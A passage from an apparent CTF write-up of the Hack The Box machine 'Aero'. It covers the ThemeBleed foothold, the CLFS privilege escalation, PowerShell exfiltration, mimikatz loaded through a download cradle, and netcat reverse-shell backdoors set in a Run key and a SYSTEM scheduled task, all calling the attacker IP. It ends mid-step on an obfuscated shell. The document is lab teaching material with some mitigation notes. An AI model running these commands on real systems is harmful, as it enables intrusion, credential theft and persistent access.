+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>|_http-title: Aero Theme Hub
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows <span style="color:#ae81ff">11</span> <span style="color:#f92672">(</span>88%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows <span style="color:#ae81ff">11</span> 21H2 <span style="color:#f92672">(</span>88%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 175.09 seconds</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><strong>Findings</strong>:
+<ul>
+<li>Nothing further which means we will be leveraging a web based attack.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="web-80">Web <code>80</code>:</h3>
+<h4 id="dirbusting-the-webserver-using-ffuf">Dirbusting the webserver using ffuf:</h4>
+<ul>
+<li><strong>I Perform some directory busting to see if there are any interesting directories</strong>:
+<ul>
+<li><code>ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://$box/FUZZ -fc 403 -ic</code></li>
+<li><figure><img src="/ox-hugo/2024-11-04-082908_.png">
+</figure>
+</li>
+<li>We can see there is an upload dir which is interesting, as this means we can most likely upload something.</li>
+</ul>
+</li>
+</ul>
+<h4 id="running-whatweb">Running whatweb</h4>
+<ul>
+<li>I run whatweb for further enumeration however it doesn&rsquo;t tell us anything additional. We knew it was <code>IIS</code> from our nmap scan.</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%20HTB/BlogEntriesMade/Aero/scans/nmap%20%20%f0%9f%8d%a3%20main%20%204GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%20%20took%202m55s%0a%f0%9f%95%99%2008:33:15%20zsh%20%e2%9d%af%20whatweb%20$box%0ahttp://10.129.229.128%20[200%20OK]%20Bootstrap,%20Cookies[.AspNetCore.Antiforgery.SV5HtsIgkxc],%20Country[RESERVED][ZZ],%20Email[support@aerohub.htb],%20HTTPServer[Microsoft-IIS/10.0],%20HttpOnly[.AspNetCore.Antiforgery.SV5HtsIgkxc],%20IP[10.129.229.128],%20Microsoft-IIS[10.0],%20Script,%20Title[Aero%20Theme%20Hub],%20X-Frame-Options[SAMEORIGIN],%20X-Powered-By[ARR/3.0]">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in HTB/BlogEntriesMade/Aero/scans/nmap  🍣 main  4GiB/7GiB | 0B/1GiB with /usr/bin/zsh  took 2m55s
+</span></span><span style="display:flex;"><span>🕙 08:33:15 zsh ❯ whatweb $box
+</span></span><span style="display:flex;"><span>http://10.129.229.128 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Bootstrap, Cookies<span style="color:#f92672">[</span>.AspNetCore.Antiforgery.SV5HtsIgkxc<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, Email<span style="color:#f92672">[</span>support@aerohub.htb<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>Microsoft-IIS/10.0<span style="color:#f92672">]</span>, HttpOnly<span style="color:#f92672">[</span>.AspNetCore.Antiforgery.SV5HtsIgkxc<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.129.229.128<span style="color:#f92672">]</span>, Microsoft-IIS<span style="color:#f92672">[</span>10.0<span style="color:#f92672">]</span>, Script, Title<span style="color:#f92672">[</span>Aero Theme Hub<span style="color:#f92672">]</span>, X-Frame-Options<span style="color:#f92672">[</span>SAMEORIGIN<span style="color:#f92672">]</span>, X-Powered-By<span style="color:#f92672">[</span>ARR/3.0<span style="color:#f92672">]</span></span></span></code></pre></div>
+    
+</div>
+<h4 id="web-site-enumeration">Web-site Enumeration:</h4>
+<ul>
+<li><strong>Web Enumeration via Burp Suite</strong>:
+<ul>
+<li>When enumerating a website, always use Burp Suite. This allows you to:
+<ul>
+<li>Record all potential injection points.</li>
+<li>Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="discovering-the-upload-portal">Discovering the upload portal:</h5>
+<ul>
+<li>
+<p><strong>Looking at the page it appears to be a single page site dedicated to windows 11 themes</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-05-160758_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>We find the upload portal straight away</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-04-083244_.png">
+</figure>
+</li>
+<li>As we can see it&rsquo;s looking for us to upload a windows theme.</li>
+</ul>
+</li>
+<li>
+<p><strong>We can see it&rsquo;s looking for</strong> &ldquo;Custom Files&rdquo;:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-04-083207_.png">
+</figure>
+</li>
+<li>I have a jpg in this folder currently as I wanted to see if it would allow any other sort of file extensions to be uploaded.</li>
+</ul>
+</li>
+<li>
+<p><strong>I do some investigating and find</strong> <a href="https://learn.microsoft.com/en-us/windows/win32/controls/themesfileformat-overview">this page</a> <strong>about</strong> <code>.theme</code> <strong>files</strong>:</p>
+<ul>
+<li>I add the extension <code>.theme</code> to a <code>jpg</code> and it&rsquo;s now visible when searching for a file to upload &amp; it appears as expected.</li>
+<li><figure><img src="/ox-hugo/2024-11-04-085220_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="discovering-themebleed-cve-2023-38146-exploit">Discovering ThemeBleed CVE-2023-38146 exploit:</h4>
+<ul>
+<li><strong>After some searching online I find that there is a known exploit for windows 11 themes called</strong> <code>ThemeBleed</code>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-04-095336_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="2-dot-foothold">2. Foothold:</h2>
+<ul>
+<li><strong>I find a POC here for the</strong> <code>ThemeBleed</code> <strong>exploit</strong>: <a href="https://github.com/Jnnshschl/CVE-2023-38146">https://github.com/Jnnshschl/CVE-2023-38146</a>
+<ul>
+<li>The creator has also written a <a href="https://jnns.de/posts/cve-2023-38146-poc/">blog-post</a> to accompany the POC.</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>+Deep Dive+: I have written a deep dive on this particular exploit you can find it here:
+<ul>
+<li><a href="https://bloodstiller.com/articles/understandingthemebleedcve-2023-38146/">https://bloodstiller.com/articles/understandingthemebleedcve-2023-38146/</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="building-the-themebleed-cve-2023-38146-reverse-shell-dll">Building the ThemeBleed CVE-2023-38146 Reverse Shell DLL:</h3>
+<ul>
+<li>
+<p>Reading the blog post we can see we need to create a reverse shell <code>dll</code> which will then be used as part of the exploit. Luckily the author has created a POC for this also:</p>
+<ul>
+<li><a href="https://github.com/Jnnshschl/ThemeBleedReverseShellDLL">https://github.com/Jnnshschl/ThemeBleedReverseShellDLL</a></li>
+</ul>
+</li>
+<li>
+<p><strong>Let&rsquo;s spin up a windows VM to build this</strong>:</p>
+<ul>
+<li>I prefer to use a Windows 10 VM customized with the <a href="https://github.com/mandiant/commando-vm">Mandiant Commando script</a></li>
+<li>You will also require Visual Studio to compile this (+not Visual Studio Code+ ), so if you don&rsquo;t have this you will need <a href="https://visualstudio.microsoft.com/downloads/">to install it</a>.</li>
+</ul>
+</li>
+<li>
+<p><strong>Setup the project</strong>:</p>
+<ul>
+<li>Open visual studio</li>
+<li>Clone the repo
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-04-174350_.png">
+</figure>
+</li>
+<li><figure><img src="/ox-hugo/2024-11-04-174430_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Put our attack IP in the relevant pat</strong>:</p>
+<ul>
+<li>On the right hand side find the <code>main.cpp</code> file ans scroll down to lines 32/34
+<ul>
+<li>We enter our Attack Machines IP &amp; Port number we want to listen on.</li>
+<li>Ensure &ldquo;autoReconnect&rdquo; is set to <code>false</code></li>
+</ul>
+</li>
+<li><figure><img src="/ox-hugo/2024-11-04-180155_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Set to release per instructions</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-04-180354_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Build the solution</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-04-180428_.png">
+</figure>
+</li>
+<li>+Note+: Building the solution is just a way to saying &ldquo;Compile the exploit&rdquo;</li>
+</ul>
+</li>
+<li>
+<p><strong>The file should be located in</strong>:</p>
+<ul>
+<li><code>C:\Users\[YourUserName]\source\repos\ThemeBleedReverseShellDLL\x64\Release\ThemeBleeedReverseShell.dll</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="running-the-themebleed-exploit-to-get-a-reverse-shell">Running the ThemeBleed Exploit to get a reverse shell:</h3>
+<ul>
+<li>
+<p><strong>Switching back to the main repo, we clone that</strong>:</p>
+<ul>
+<li><code>git clone https://github.com/Jnnshschl/CVE-2023-38146.git</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Moving the compiled reverse shell to the relevant folder</strong>:</p>
+<ul>
+<li>Reading the instructions we need to move the compiled <code>ThemeBleeedReverseShell.dll</code> file to the <code>tb</code> folder in the main repo &amp; rename it to <code>Aero.msstyles_vrf_evil.dll</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-04-181130_.png">
+</figure>
+</li>
+<li>+Note+: On the repo it says to move it to <code>td</code> but it&rsquo;s actually called <code>tb</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Next I start my nc listner</strong>:</p>
+<ul>
+<li><code>rlwrap -cAr nc -nvlp 4711</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Trigger the exploit</strong>:</p>
+<ul>
+<li><code>python3 themebleed.py -r [MYAttackMachine] --no-dll</code></li>
+</ul>
+</li>
+<li>
+<p><strong>It connects and we get our revers shell</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-04-181233_.png">
+</figure>
+</li>
+<li>As we can see it also appears to dump the hash for <code>sam.emerson</code> and connects as them I tried to crack this with <code>rockyou.txt</code> but no hits.</li>
+</ul>
+</li>
+</ul>
+<h3 id="enumerating-as-sam-dot-emerson">Enumerating as sam.emerson:</h3>
+<ul>
+<li>
+<p><strong>Get the user flag</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-04-181935_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Looking in documents we find a CVE-2023-28252 pdf and a file called</strong> <code>watchdog.ps1</code></p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-04-182331_.png">
+</figure>
+
+<ul>
+<li>What looks interesting is the <code>CVE-2023-28252_Summary.pdf</code> lets grab that.</li>
+<li>+Note+: I checked out the <code>watchdog.ps1</code> script but it&rsquo;s just how the box works by checking for uploaded themes periodically (every 15 seconds)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="exfiltrating-the-cve-2023-28252-summary-dot-pdf-using-base64-encoding">Exfiltrating the CVE-2023-28252_Summary.pdf using base64 encoding:</h3>
+<ul>
+<li>
+<p>As we only have 1 connection and no evil-winrm etc we have to live off the land. Luckily we can easily exfiltrate this using PowerShell &amp; base64 encoding.</p>
+<ul>
+<li>+Note+: I actually have a custom webserver called <a href="https://bloodstiller.com/tools/bloodserver/">bloodserver</a> which would be perfect for this but I wanted to challenge myself to live off the land as much as possible with this box so stuck to using inbuilt windows functionality where possible.</li>
+</ul>
+</li>
+<li>
+<p><strong>Lets base64 encode the pdf and assign to the variable</strong> <code>$b64</code>:</p>
+<ul>
+<li><code>$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Users\sam.emerson\Documents\CVE-2023-28252_Summary.pdf' -Encoding Byte))</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-05-163435_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Setup our listner</strong>:</p>
+<ul>
+<li><code>nc -nvlp 9999</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Send the base64 encoded pdf to our attack host</strong>:</p>
+<ul>
+<li><code>Invoke-WebRequest -Uri http://10.10.14.121:9999/ -Method POST -Body $b64</code></li>
+<li><figure><img src="/ox-hugo/2024-11-05-163413_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Received on listner</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-05-163343_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Decode the base64 encoded string</strong>:</p>
+<ul>
+<li><code>echo &quot;[bas64encodedpdf]&quot; | base64 -d -w 0 &gt;  CVE-2023-28252_Summary.pdf</code></li>
+<li><figure><img src="/ox-hugo/2024-11-05-163313_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Reading the PDF goes more in depth about CVE-2023-28252</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-05-175535_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-dot-privilege-escalation">3. Privilege Escalation:</h2>
+<h3 id="researching-cve-2023-28252--clfs--vulnerability">Researching CVE-2023-28252 (CLFS) Vulnerability:</h3>
+<p>So as it looks like this host is vulnerable to this specific exploit (well its implied) lets find a POC.</p>
+<ul>
+<li>
+<p><strong>After some looking online I find various exploits however this one is actually pre-compiled and can save us some time.</strong></p>
+<ul>
+<li><a href="https://github.com/duck-sec/CVE-2023-28252-Compiled-exe">https://github.com/duck-sec/CVE-2023-28252-Compiled-exe</a></li>
+<li>+Note+: Looking at the notes it also allows us to pass another binary as an argument to be executed. This is ideal as if we can run a process/binary with elevated privileges we can get a reverse shell as <code>NT/Authority</code></li>
+</ul>
+</li>
+<li>
+<p>+Deep Dive+: I have written a deep dive on this particular exploit you can find it here:</p>
+<ul>
+<li><a href="https://bloodstiller.com/articles/understanding2023-28252-clfs/">https://bloodstiller.com/articles/understanding2023-28252-clfs/</a></li>
+</ul>
+</li>
+<li>
+<p><strong>I clone exploit</strong>:</p>
+<ul>
+<li><code>git clone https://github.com/duck-sec/CVE-2023-28252-Compiled-exe.git</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Transfer the exploit to the target</strong>:</p>
+<ul>
+<li><code>wget http://10.10.14.121:9000/exploit.exe -o ex.exe</code></li>
+<li><figure><img src="/ox-hugo/2024-11-04-194403_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>As this exploit allows us to execute a binary as an argument lets transfer</strong> <code>n64.exe</code> <strong>to the target too</strong>:</p>
+<ul>
+<li><code>wget http://10.10.14.121:9000/nc64.exe -o nc64.exe</code></li>
+<li><figure><img src="/ox-hugo/2024-11-04-194156_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Lets start our listener for our reverse-shell</strong>:</p>
+<ul>
+<li><code>rlwrap -cAr nc -nvlp 443</code></li>
+<li><figure><img src="/ox-hugo/2024-11-04-194636_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I trigger exploit and pass n64.exe as an argument</strong>:</p>
+<ul>
+<li><code>.\ex.exe 1208 1 &quot;C:\Users\sam.emerson\Documents\nc64.exe 10.10.14.121 443 -e cmd&quot;</code></li>
+<li><figure><img src="/ox-hugo/2024-11-04-194705_.png">
+</figure>
+</li>
+<li><strong>High level Command Breakdown</strong>:
+<ul>
+<li><code>.\ex.exe</code>: The compiled exploit executable</li>
+<li><code>1208</code>: Process ID to target</li>
+<li><code>1</code>: Execution mode flag</li>
+<li>Netcat parameters:
+<ul>
+<li><code>10.10.14.121</code>: Our attack IP address</li>
+<li><code>443</code>: Port to connect back to</li>
+<li><code>-e cmd</code>: Execute cmd.exe and bind it to the connection</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Catch</strong> <code>NT/Authority</code> <strong>system shell</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-04-194750_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Grab root flag</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-04-194858_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-dot-persistence">4. Persistence:</h2>
+<h3 id="trying-to-dump-creds-with-mimikatz">Trying to dump creds with mimikatz:</h3>
+<ul>
+<li><strong>I try and Transfer</strong> <code>mimikatz</code> <strong>but it gets caught by</strong> <code>amsi</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-04-200330_.png">
+</figure>
+</li>
+<li>I try multiple different ways however it&rsquo;s caught each time, luckily there are versions of mimikatz we can from memory:</li>
+</ul>
+</li>
+</ul>
+<h3 id="using-invoke-mimikatz-dot-ps1-with-a-download-cradle-to-dump-hashes">Using invoke-mimikatz.ps1 with a download cradle to dump hashes:</h3>
+<ul>
+<li><strong>Use a download cradle to grab the script</strong>:
+<ul>
+<li><code>iex(new-object net.webclient).downloadstring('http://10.10.14.121:9000/Invoke-Mimikatz.ps1')</code></li>
+</ul>
+</li>
+<li><strong>Perform LSADUMP</strong>:
+<ul>
+<li><code>Invoke-Mimikatz -Command '&quot;privilege::debug&quot; &quot;lsadump::sam&quot;'</code></li>
+<li>+Note+: With this information we can make a <code>kerberos</code> silver ticket; however we have no way to actually authenticate with the host once it&rsquo;s made as nothing is open…so we will need to look at other solutions.
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-05-130731_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="download-cradle-primer">Download Cradle Primer:</h4>
+<ul>
+<li>We are going to be using a download cradle later, so it&rsquo;s probably best you understand how they work.</li>
+</ul>
+<h5 id="what-is-a-download-cradle">What is a Download Cradle?</h5>
+<p>In essence, a download cradle is a lightweight script or command that reaches out to the internet/host, downloads a file, and often executes it directly in memory. And that is why they work so well, as nothing is written to disk and instead runs in memory they are harder to detect:</p>
+<ul>
+<li><strong>If we look at the</strong> <code>invoke-mimikatz.ps1</code> <strong>script we called</strong>:
+<ul>
+<li><code>iex(new-object net.webclient).downloadstring('http://10.10.14.121:9000/Invoke-Mimikatz.ps1')</code></li>
+<li>This reaches out to a remote URL (our attack hosts), download&rsquo;s the payload, and execute &amp; loads it into memory all in one go. (later on you will see me use this again but instead to create a reverse shell that is called upon loading into memory)</li>
+</ul>
+</li>
+</ul>
+<h5 id="how-do-attackers-use-download-cradles">How Do Attackers Use Download Cradles:</h5>
+<p>There are multiple ways to leverage download cradles in various stages of an attack. The most common is often during initial access or lateral movement phases. Here are some common scenarios:</p>
+<ul>
+<li><strong>Delivering Malware</strong>: By downloading and running malware directly in memory, it is possible to bypass traditional file-based antivirus.
+<ul>
+<li>This is often done by ransomware gangs.</li>
+</ul>
+</li>
+<li><strong>Moving Through a Network</strong>: In the above case we can use cradles to download tools for privilege escalation or credential theft as we navigate a compromised network/machine.</li>
+<li><strong>Running Exploits</strong>: Tools like Metasploit use download cradles to quickly deliver payloads that exploit vulnerabilities and gain control over systems.</li>
+</ul>
+<h5 id="why-download-cradles-are-effective">Why Download Cradles are Effective:</h5>
+<ul>
+<li>They are a great attack approach as they are:
+<ul>
+<li><strong>Stealthy</strong>: As they work without writing to disk, they leave less evidence for traditional detection tools.</li>
+<li><strong>Compact</strong>: Cradles can be as short as a single line of code (as you can see with invoke-mimikatz), making them hard to spot amid legitimate scripts.</li>
+<li><strong>Flexible</strong>: They can be adjusted and modified allowing what is being downloaded to be executed in real-time, adapting to the environment.</li>
+</ul>
+</li>
+</ul>
+<h5 id="detecting-and-stopping-download-cradles">Detecting and Stopping Download Cradles:</h5>
+<p>While they’re sneaky, download cradles can be detected with the right strategies:</p>
+<ul>
+<li><strong>Network Monitoring</strong>: Watching for suspicious connections or repeated download attempts from unusual sources can reveal download cradle activity.</li>
+<li><strong>Script Restrictions</strong>: Limit the use of <code>PowerShell</code>, <code>Curl</code>, or <code>Wget</code> in environments where they aren’t essential. <code>PowerShell</code>, for instance, can be configured to block the <code>Invoke-WebRequest</code> command or require execution approval.</li>
+<li><strong>EDR Solutions</strong>: Endpoint Detection and Response (EDR) tools can help track process execution and identify cradle behaviors based on known patterns and heuristics.</li>
+</ul>
+<h3 id="creating-a-new-user-who-is-part-of-the-administrators-group">Creating a new user who is part of the administrators group:</h3>
+<ul>
+<li>
+<p>As we are an administrator we can also add a new user and add them to the administrators group.</p>
+</li>
+<li>
+<p><strong>I add a new user as part of the administrators group</strong>:</p>
+<ul>
+<li><code>net user bloodstiller bl00dst1ll3r! /add</code></li>
+<li><code>net localgroup Administrators bloodstiller /add</code></li>
+<li><figure><img src="/ox-hugo/2024-11-04-201031_.png">
+</figure>
+</li>
+<li>+Note+: I am doing this purely as a mechanism to showcase different ways to establish persistence, however as you have probably noticed there is no way to actually login as this user, the same way as there would be no way to use the Administrators Silver ticket if we made it, so what do we do, glad you asked.</li>
+</ul>
+</li>
+</ul>
+<h3 id="living-off-the-land-persistence">Living off the land persistence:</h3>
+<ul>
+<li>As this system only has the webserver running there are no other services we can authenticate against as a means of persistence. Creating silver tickets and adding admin users is great but if we cannot actually utilize those accounts &amp; tickets what can we do? We need to have the host call out to us, by creating a backdoor, or multiple back-doors.</li>
+</ul>
+<h4 id="creating-a-registry-key-for-a-back-door">Creating a registry key for a back-door:</h4>
+<ul>
+<li>The first backdoor I will create is to create an entry in the registry that runs on login, so that when a user logs in it will call out to my attack machine which has a listener running.</li>
+<li><strong>Registry Key added</strong>:
+<ul>
+<li><code>Reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v NewBackDoor /t REG_SZ /d &quot;C:\Users\sam.emerson\Documents\nc64.exe 10.10.14.121 4433 -e cmd&quot;</code></li>
+<li><figure><img src="/ox-hugo/2024-11-05-100419_.png">
+</figure>
+</li>
+<li>This will trigger when a user logs in, however as we have no way to test this or login as a normal user, we will need to also have another way in.</li>
+</ul>
+</li>
+</ul>
+<h5 id="registry-backdoor-command-breakdown">Registry Backdoor Command Breakdown:</h5>
+<ul>
+<li>
+<p><strong>Command Breakdown:</strong></p>
+<ul>
+<li>
+<p><code>Reg add</code></p>
+<ul>
+<li>Adds or modifies a registry key or value.</li>
+</ul>
+</li>
+<li>
+<p><code>&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&quot;</code></p>
+<ul>
+<li>Specifies the registry path.</li>
+<li>The <code>Run</code> key allows programs to run automatically when the user logs in.</li>
+</ul>
+</li>
+<li>
+<p><code>/v NewBackDoor</code></p>
+<ul>
+<li>Specifies the name of the registry value being added, here <code>NewBackDoor</code>.</li>
+<li>Acts as the identifier for this specific entry.</li>
+</ul>
+</li>
+<li>
+<p><code>/t REG_SZ</code></p>
+<ul>
+<li>Defines the type of the registry value.</li>
+<li><code>REG_SZ</code> is a string value type commonly used for paths or commands.</li>
+</ul>
+</li>
+<li>
+<p><code>/d &quot;C:\Users\sam.emerson\Documents\nc64.exe 10.10.14.121 4433 -e cmd&quot;</code></p>
+<ul>
+<li>Sets the data for the registry value.</li>
+<li><strong>Path</strong>: <code>&quot;C:\Users\sam.emerson\Documents\nc64.exe&quot;</code>
+<ul>
+<li>Path to <code>nc64.exe</code> (likely <code>Netcat</code>), used to open a reverse shell.</li>
+</ul>
+</li>
+<li><strong>IP Address*</strong>: <code>10.10.14.121</code>
+<ul>
+<li>Our attack machine that is listening where the reverse shell will connect.</li>
+</ul>
+</li>
+<li><strong>Port</strong>: <code>4433</code>
+<ul>
+<li>The port number on our attack machine listening for the connection.</li>
+</ul>
+</li>
+<li><strong>Flag</strong>: <code>-e cmd</code>
+<ul>
+<li>The <code>-e</code> flag executes <code>cmd.exe</code> upon connection, providing a command shell.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Potential Defenses/Mitigation&rsquo;s</strong>:</p>
+<ul>
+<li><strong>Monitoring</strong>: Detect unusual registry changes in <code>HKEY_CURRENT_USER\...\Run</code>.</li>
+<li><strong>Network Monitoring</strong>: Watch for unusual outgoing connections to external IPs and ports.</li>
+</ul>
+</li>
+</ul>
+<h4 id="creating-a-scheduled-task-back-door">Creating a scheduled task back-door:</h4>
+<ul>
+<li>A great means of creating persistence is to create a scheduled task that runs periodically and calls back out to our attack machine. I&rsquo;ve put two approaches below.</li>
+</ul>
+<h5 id="version-1-using-nc64-dot-exe-to-connect-back-to-our-attack-host-periodically">Version 1: Using nc64.exe to connect back to our attack host periodically:</h5>
+<ul>
+<li><strong>Scheduled Task Backdoor</strong>:
+<ul>
+<li><code>schtasks /create /tn BackDoor /tr &quot;C:\Users\sam.emerson\Documents\nc64.exe  10.10.14.121 4433 -e cmd&quot; /sc minute /mo 1 /ru System</code></li>
+<li><figure><img src="/ox-hugo/2024-11-05-100459_.png">
+</figure>
+
+<ul>
+<li>+Note+: This techniques runs every 1 minute and calls out to my attack machine. This means that even if I disconnect I can turn on my listener again and it will call back out to our attack host:</li>
+</ul>
+</li>
+<li><strong>Shell Caught</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-05-100314_.png">
+</figure>
+</li>
+<li>Just to double check I disconnect to ensure it calls back out to me:
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-05-100604_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>Scheduled Task Backdoor Command Breakdown Running a Binary:</p>
+<ul>
+<li>
+<p><strong>Command Breakdown</strong>:</p>
+<ul>
+<li><code>schtasks /create</code>
+<ul>
+<li>Creates a new scheduled task on Windows.</li>
+</ul>
+</li>
+<li><code>/tn BackDoor</code>
+<ul>
+<li>Sets the task name to <code>BackDoor</code>.</li>
+<li>This name is how the task will appear in the Task Scheduler.</li>
+</ul>
+</li>
+<li><code>/tr &quot;C:\Users\sam.emerson\Documents\nc64.exe 10.10.14.121 4433 -e cmd&quot;</code>
+<ul>
+<li>Specifies the action that the task will execute.</li>
+<li><strong>Path</strong>: <code>&quot;C:\Users\sam.emerson\Documents\nc64.exe&quot;</code>
+<ul>
+<li>Path to <code>nc64.exe</code>, used to open a reverse shell.</li>
+</ul>
+</li>
+<li><strong>IP Address*</strong>: <code>10.10.14.121</code>
+<ul>
+<li>Our attack machine that is listening where the reverse shell will connect.</li>
+</ul>
+</li>
+<li><strong>Port</strong>: <code>4433</code>
+<ul>
+<li>The port number on our attack machine listening for the connection.</li>
+</ul>
+</li>
+<li><strong>Flag</strong>: <code>-e cmd</code>
+<ul>
+<li>The <code>-e</code> flag executes <code>cmd.exe</code> upon connection, providing a command shell.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>/sc minute</code>
+<ul>
+<li>Sets the task&rsquo;s schedule frequency to every minute.</li>
+</ul>
+</li>
+<li><code>/mo 1</code>
+<ul>
+<li>Modifier that, when used with <code>/sc minute</code>, runs the task every 1 minute.</li>
+</ul>
+</li>
+<li><code>/ru System</code>
+<ul>
+<li>Specifies that the task should run with <code>System</code> privileges.</li>
+<li>Running as <code>System</code> grants high privileges, making this backdoor more dangerous.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Potential Defenses/Mitigation&rsquo;s</strong>:</p>
+<ul>
+<li><strong>Monitor Scheduled Tasks</strong>: Regularly check for unauthorized or unusual tasks, especially those scheduled to run frequently or with <code>System</code> privileges.</li>
+<li><strong>Network Monitoring</strong>: Identify repeated outgoing connections to unknown IPs and ports, especially if made by <code>nc64.exe</code> or similar executables.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="version-2-using-a-base64-encoded-powershell-reverse-shell-and-download-cradle-to-connect-back-to-our-attack-host">Version 2: Using a base64 encoded PowerShell reverse shell and download cradle to connect back to our attack host:</h5>
+<ul>
+<li>
+<p>So using the above method with nc64.exe is great and all, but an n64.exe binary will stick out like a sore thumb. A better option would be to create a powershell script and use a download cradle to call back to ourselves, this way everything is loaded in memory and nothing is written to the disk (bar our registry entry)</p>
+</li>
+<li>
+<p><strong>Create our reverse-shell script</strong>:</p>
+<ul>
+<li>I use a base64 obfuscated powershell reverse shell as otherwise the AV was able to detect it. I like using <a href="https://revshells.com">https://revshells.com</a> for this
